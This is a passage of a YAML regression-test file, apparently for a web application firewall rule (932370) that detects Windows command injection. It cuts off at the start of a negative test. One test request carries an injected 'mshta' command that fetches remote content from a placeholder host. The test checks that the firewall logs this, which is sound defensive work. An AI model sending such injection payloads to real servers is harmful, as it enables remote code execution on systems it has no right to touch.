            port: 80
            # "cmd=; mshta http://example.com"
            uri: /get?cmd=;%20mshta%20http://example.com
            version: HTTP/1.0
          output:
            log_contains: id "932370"
  - test_title: 932370-4
    desc: Windows Command Injection bypass with time negative test
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Host: localhost
